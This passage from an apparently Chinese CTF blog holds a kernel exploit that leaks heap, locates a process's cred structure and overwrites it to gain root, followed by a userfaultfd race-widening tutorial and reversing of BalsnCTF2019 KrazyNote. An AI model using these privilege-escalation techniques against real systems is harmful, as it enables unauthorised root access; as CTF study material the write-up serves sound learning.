class="number">32</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> low_4 = addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    usr_buf[<span class="number">0</span>] = low_4 &amp; <span class="number">0xff</span>;</span><br><span class="line">    usr_buf[<span class="number">1</span>] = (low_4 &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">2</span>] = (low_4 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    usr_buf[<span class="number">3</span>] = (low_4 &gt;&gt; <span class="number">16</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">4</span>] = (high_4 &amp; <span class="number">0xff</span>);</span><br><span class="line">    usr_buf[<span class="number">5</span>] = (high_4 &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">6</span>] = (high_4 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    usr_buf[<span class="number">7</span>] = (high_4 &gt;&gt; <span class="number">16</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    usr_buf[<span class="number">9</span>] = <span class="number">0x10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> hidden_str[<span class="number">0x10</span>];</span><br><span class="line">    <span class="built_in">strncpy</span>(hidden_str,<span class="string">"ama2in9PwnForMe\x00"</span>,<span class="number">0x10</span>);</span><br><span class="line">    prctl(PR_SET_NAME,hidden_str);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/OOB"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-]open failed!\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> ini_buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    Malloc(fd,<span class="number">0</span>,ini_buf);</span><br><span class="line">    <span class="comment">//Read(fd,0,0x20,0xe0);</span></span><br><span class="line">    <span class="comment">//leak heap</span></span><br><span class="line">    <span class="built_in">memset</span>(usr_buf,<span class="string">'\x00'</span>,BUFSZ);</span><br><span class="line">    Read(fd,<span class="number">0xc7</span>,<span class="number">0xfff2ff9da00023f2</span>L,<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">char</span>* ptr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> heap_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> hex[<span class="number">0x10</span>];</span><br><span class="line">    <span class="built_in">strncpy</span>(hex,usr_buf,<span class="number">0x2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]hex:%x\n"</span>,hex[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//heap_base1 = strtoull(usr_buf,usr_buf+0x10,0x10);</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">        <span class="keyword">if</span>(usr_buf[i] != <span class="string">'\x00'</span>)</span><br><span class="line">            count += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"total count:%d\n"</span>,count);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tmp;</span><br><span class="line">        <span class="built_in">sscanf</span>(&amp;usr_buf[i],<span class="string">"%c"</span>,&amp;tmp);</span><br><span class="line">        tmp = tmp &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]char:%x\n"</span>,usr_buf[i]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(&amp;usr_buf[i]) == <span class="number">0</span>)</span><br><span class="line">            tmp = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]tmp:%x\n"</span>,tmp);</span><br><span class="line">        heap_base += (tmp &lt;&lt; (<span class="number">8</span>*i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak heap success:0x%llx\n"</span>,heap_base);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x10</span><span class="number">-4</span>;i++)</span><br><span class="line">        Malloc(fd,i,ini_buf);</span><br><span class="line">    <span class="comment">//for(int i = 0;i &lt; 0x10-4;i++)</span></span><br><span class="line">    <span class="comment">//    Free(fd,i);</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//sub processs</span></span><br><span class="line">        <span class="keyword">char</span> hidden_str1[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">strncpy</span>(hidden_str1,<span class="string">"ama2in9PwnForFun"</span>,<span class="number">0x10</span>);</span><br><span class="line">        prctl(PR_SET_NAME,hidden_str1);</span><br><span class="line">        <span class="keyword">while</span>(getuid())&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[-] not yet\n"</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]root"</span>);</span><br><span class="line">        system(<span class="string">"cat /flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//fuck </span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> start_addr = heap_base;</span><br><span class="line">    <span class="comment">//unsigned long long start_addr = heap_base &amp; 0xfffffff000000000;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> end_addr = heap_base + (<span class="number">0xffff88801e3de000</span><span class="number">-0xffff88800017d400</span>);</span><br><span class="line">    <span class="comment">//unsigned long long end_addr = 0xffffc80000000000;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]fuck start addr:0x%llx\n"</span>,start_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]fuck end addr:0x%llx\n"</span>,end_addr);</span><br><span class="line">    <span class="keyword">size_t</span> off_idx = (start_addr<span class="number">-0xffffffffa0002420</span>) / <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]fuck idx:0x%llx\n"</span>,off_idx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]finding str:%s\n"</span>,hidden_str);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> target_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;start_addr &lt; end_addr;start_addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//strncpy(ini_buf,usr_buf,8);</span></span><br><span class="line">        <span class="built_in">memset</span>(usr_buf,<span class="string">'\x00'</span>,BUFSZ);</span><br><span class="line">        <span class="comment">//sprintf(usr_buf,"%llu",&amp;start_addr);</span></span><br><span class="line">        LongToStr(start_addr);</span><br><span class="line">        <span class="comment">//write to the bss</span></span><br><span class="line">        Write(fd,<span class="number">0xc7</span>,<span class="number">0xfff2ff9da00023f2</span>L,<span class="number">0x10</span>);</span><br><span class="line">        <span class="comment">//read to usr_buf</span></span><br><span class="line">        Read(fd,<span class="number">0</span>,<span class="number">0</span>,BUFSZ);</span><br><span class="line">        <span class="comment">//find</span></span><br><span class="line">        result = memmem(usr_buf,BUFSZ,hidden_str,<span class="number">16</span>);</span><br><span class="line">		<span class="keyword">if</span> (result)</span><br><span class="line">		&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]find success:0x%llx\n"</span>,start_addr);</span><br><span class="line">			cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x8</span>);</span><br><span class="line">			real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">			<span class="keyword">if</span>( (cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))&#123;</span><br><span class="line">				<span class="comment">//printf("[]%lx[]",result-(int)(buf));</span></span><br><span class="line">				target_addr = start_addr + result-(<span class="keyword">int</span>)(usr_buf);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[+]found task_struct 0x%lx\n"</span>,target_addr);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[+]found cred 0x%lx\n"</span>,real_cred);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//slab hijack</span></span><br><span class="line">    <span class="built_in">memset</span>(usr_buf,<span class="string">'\x00'</span>,BUFSZ);</span><br><span class="line">    LongToStr(cred);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &gt; <span class="number">0</span>;i--)</span><br><span class="line">        Free(fd,i);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,heap_base+<span class="number">0x100</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3100</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3000</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    <span class="comment">//Read(fd,0xc7,0xfff2ff9da00023f2L,0x8);</span></span><br><span class="line">    Malloc(fd,<span class="number">1</span>,ini_buf);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3100</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x10</span>);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3000</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">size_t</span> <span class="keyword">final</span>[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(<span class="keyword">final</span>,<span class="string">'\x00'</span>,<span class="keyword">sizeof</span>(<span class="keyword">final</span>));</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0x3</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i++)</span><br><span class="line">        <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">3</span>;i++)</span><br><span class="line">        <span class="keyword">final</span>[idx++] = <span class="number">0x0000003fffffffff</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffffffff8183e420</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffffffff8183e4a0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffff88800012f6a0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffff88800001f980</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i++)</span><br><span class="line">        <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">3</span>;i++)</span><br><span class="line">        <span class="keyword">final</span>[idx++] = <span class="number">0x0000003fffffffff</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffffffff8183e420</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffffffff8183e4a0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffff88800012f6a0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    Read(fd,<span class="number">0xc7</span>,cred<span class="number">-0x000d00620000002e</span>L,<span class="number">0x100</span>*<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">char</span> zero[<span class="number">0x28</span>];</span><br><span class="line">    <span class="built_in">memset</span>(usr_buf,<span class="string">'\x00'</span>,<span class="number">0x30</span>);</span><br><span class="line">    usr_buf[<span class="number">0</span>] = <span class="string">'\x03'</span>;</span><br><span class="line">    Malloc(fd,<span class="number">2</span>,usr_buf);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">10</span>;i &gt; <span class="number">3</span>;i--)</span><br><span class="line">        Free(fd,i);</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        system(<span class="string">"id"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="使用userfaultfd缺页扩大窗口期"><a href="#使用userfaultfd缺页扩大窗口期" class="headerlink" title="使用userfaultfd缺页扩大窗口期"></a>使用userfaultfd缺页扩大窗口期</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>之前想复现n1ctf的babykernel和de1ctf的race，发现官方题解中都有mmap的部分，一直不是很理解，终于在先知上找到一篇相关的<a href="https://xz.aliyun.com/t/6653" target="_blank" rel="noopener">文章</a>，写的非常详细，因此自己实践了一下(照着exp打了一遍)，记录一下userfaultfd的使用</p>
<h3 id="BalsnCTF2019-KrazyNote"><a href="#BalsnCTF2019-KrazyNote" class="headerlink" title="BalsnCTF2019 KrazyNote"></a>BalsnCTF2019 KrazyNote</h3><h4 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h4><h6 id="页和虚内存"><a href="#页和虚内存" class="headerlink" title="页和虚内存"></a>页和虚内存</h6><p>内核的内存主要有两个区域，RAM和交换区，将要被使用的内存放在RAM，暂时用不到的内存放在交换区，内核控制交换进出的过程。RAM中的地址是物理地址，内核使用虚拟地址，其通过多级页表建立虚拟地址到物理地址的映射</p>
<h6 id="页调度和延迟加载"><a href="#页调度和延迟加载" class="headerlink" title="页调度和延迟加载"></a>页调度和延迟加载</h6><p>有的内存既不在RAM又不在交换区，比如mmap出来的内存，这块内存在读写它之前实际上并没有被创建（没有映射到实际的物理页），例如<code>mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0);</code>实际上并没有把fd对应的内容拷贝到这块区域，只是将地址<code>0x1337000</code>映射到<code>fd</code>这个文件。</p>
<p>当有以下代码访问时：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *a = (<span class="keyword">char</span> *)<span class="number">0x1337000</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"content: %c\n"</span>, a[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<p>内核会做以下事情：</p>
<ol>
<li>为0x1337000创建物理帧</li>
<li>从fd读取内容到0x1337000</li>
<li>增加一个页表的索引</li>
</ol>
<p>总之，如果是初次访问mmap的页，<code>耗时会很长，导致上下文切换以及当前线程的睡眠</code></p>
<h5 id="别名页"><a href="#别名页" class="headerlink" title="别名页"></a>别名页</h5><p>没有ABI可以直接访问物理帧，但内核有时候需要需要修改物理帧的值(例如修改页表入口)，于是引入了别名页，将物理帧映射到虚拟页。在每个线程的启动和退出过程中，一般都有两个物理帧映射到它。别名页的地址一般是<code>SOME_OFFSET+physical_addr</code></p>
<h5 id="userfaultfd机制"><a href="#userfaultfd机制" class="headerlink" title="userfaultfd机制"></a>userfaultfd机制</h5><p>这个机制可以让用户自己处理缺页，可以在用户空间定义一个<code>userfault handler</code>，用法见<a href="http://man7.org/linux/man-pages/man2/userfaultfd.2.html" target="_blank" rel="noopener">官方文档</a>。大概步骤如下：</p>
<ol>
<li>创建一个描述符uffd：所有的注册区间、配置和最终缺页处理都需要ioctl对这个fd进行处理。我们可以用UFFDIO_REGISTER注册一块监视区域，这个区域发生缺页的时候使用UFFDIO_COPY向缺页地址拷贝数据</li>
<li>用UFFDIO_REGISTER注册监视区域</li>
<li>创建专用线程用来轮询和处理缺页事件</li>
</ol>
<p>观察可以发现其中大部分操作都是固定的，我们可以自己整理一个头文件加进去，用的时候很方便。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;ua) == <span class="number">-1</span>)&#123;</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO API"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mmap(FAULT_PAGE,<span class="number">0x1000</span>,<span class="number">7</span>,<span class="number">0x22</span>,<span class="number">-1</span>,<span class="number">0</span>) != FAULT_PAGE)</span><br><span class="line">        ErrExit(<span class="string">"[-]mmap failed!"</span>);</span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO Register"</span>);</span><br><span class="line">    <span class="comment">//register the func</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr,<span class="literal">NULL</span>,handler,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]pthread create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="comment">// 轮询uffd读到的信息需要存在一个struct uffd_msg对象中</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="comment">// ioctl的UFFDIO_COPY选项需要我们构造一个struct uffdio_copy对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line">      ......</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123; <span class="comment">// 此线程不断进行polling，所以是死循环</span></span><br><span class="line">        <span class="comment">// poll需要我们构造一个struct pollfd对象</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="comment">// 读出user-fault相关信息</span></span><br><span class="line">        read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="comment">// 对于我们所注册的一般user-fault功能，都应是UFFD_EVENT_PAGEFAULT这个事件</span></span><br><span class="line">        assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">        <span class="comment">// 构造uffdio_copy进而调用ioctl-UFFDIO_COPY处理这个user-fault</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        我们自己的处理逻辑</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// page(我们已有的一个页大小的数据)中page_size大小的内容将被拷贝到新分配的msg.arg.pagefault.address内存页中</span></span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy);</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>这个内核模块逆的时候看起来很麻烦，结合别人博客的分析搞清楚了逻辑，其实是在<code>bss</code>上一块大小为<code>0x2000</code>的区域模拟<code>heap</code>的分配，首先搞清楚我们输入的数据结构和内核模块存储的单个数据结构。用户输入的结构体类型为<code>UserAttr</code>，其中<code>idx</code>指明note的索引，length对应分配的大小，user_buf为拷贝到note里content_arr的字符串或者从中读取数据的字符串。</p>
<p>一个note struct由四个成员组成，第一个是<code>key</code>，这个值根据原作者的分析是<code>task_struct.mm-&gt;pgd,页全局目录的存放位置)</code>,<code>length</code>是后面content_arr动态数组的大小(最大不超过0x100)，<code>contentPtr</code>保存的是<code>content_arr-page_offset_base</code>这里的<code>page_off_base</code>就是我们之前提到的那个别名页的<code>SOME_OFFSET</code>。最后的<code>content_arr</code>是一个动态数组，其大小由<code>New</code>的时候用户给的<code>length</code>决定</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">00000000 UserAttr        struc ; (sizeof=0x18, mappedto_3)</span></span><br><span class="line"><span class="comment">00000000                                         ; XREF: unlocked_ioctl/r</span></span><br><span class="line"><span class="comment">00000000 idx             dq ?                    ; XREF: unlocked_ioctl+26/w</span></span><br><span class="line"><span class="comment">00000000                                         ; unlocked_ioctl+6A/r ...</span></span><br><span class="line"><span class="comment">00000008 length          dq ?                    ; XREF: unlocked_ioctl+2E/w</span></span><br><span class="line"><span class="comment">00000008                                         ; unlocked_ioctl+6E/r ...</span></span><br><span class="line"><span class="comment">00000010 user_buf        dq ?                    ; XREF: unlocked_ioctl+4D/w</span></span><br><span class="line"><span class="comment">00000010                                         ; unlocked_ioctl:loc_1AE/r ...</span></span><br><span class="line"><span class="comment">00000018 UserAttr        ends</span></span><br><span class="line"><span class="comment">00000018</span></span><br><span class="line"><span class="comment">00000000 ; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">00000000</span></span><br><span class="line"><span class="comment">00000000 node            struc ; (sizeof=0x118, mappedto_4)</span></span><br><span class="line"><span class="comment">00000000 key             dq ?</span></span><br><span class="line"><span class="comment">00000008 length          dq ?</span></span><br><span class="line"><span class="comment">00000010 contentPtr      dq ?</span></span><br><span class="line"><span class="comment">00000018 content_arr     db 256 dup(?)</span></span><br><span class="line"><span class="comment">00000118 node            ends</span></span><br><span class="line"><span class="comment">00000118</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>从<code>init_module</code>开始，注册了一个设备在0x620，设备名下面就是用户自己定义的<code>file_ops</code>,而0x680全是空，也就是说全部使用默认的操作函数。看下源码会发现这里的<code>ioctl</code>是<code>unlocked_ioctl</code>也就是存在竞争</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">init_module</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(a1, a2, a3);</span><br><span class="line">  bufPtr = (node *)&amp;unk_B60;</span><br><span class="line">  <span class="keyword">return</span> misc_register(&amp;dev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">.data:0000000000000620 0B                      dev             db  0Bh                 ; DATA XREF: init_module+5↑o</span></span><br><span class="line"><span class="comment">.data:0000000000000620                                                                 ; cleanup_module+5↑o</span></span><br><span class="line"><span class="comment">.data:0000000000000621 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000622 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000623 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000624 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000625 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000626 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000627 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000628 9C 04 00 00 00 00 00 00                 dq offset aNote         ; "note"</span></span><br><span class="line"><span class="comment">.data:0000000000000630 80 06 00 00 00 00 00 00                 dq offset unk_680</span></span><br><span class="line"><span class="comment">.data:0000000000000638 00 00 00 00 00 00 00 00+                align 80h</span></span><br><span class="line"><span class="comment">.data:0000000000000680 00                      unk_680         db    0                 ; DATA XREF: .data:0000000000000630↑o</span></span><br><span class="line"><span class="comment">.data:0000000000000681 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000682 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000683 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000684 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000685 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000686 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000687 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000688 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000689 00                                      db    0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// file_operations结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*read_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">    <span class="keyword">int</span> (*iopoll)(struct kiocb *kiocb, <span class="keyword">bool</span> spin);</span><br><span class="line">    <span class="keyword">int</span> (*iterate) (struct file *, struct dir_context *);</span><br><span class="line">    <span class="keyword">int</span> (*iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line">    <span class="keyword">__poll_t</span> (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line">    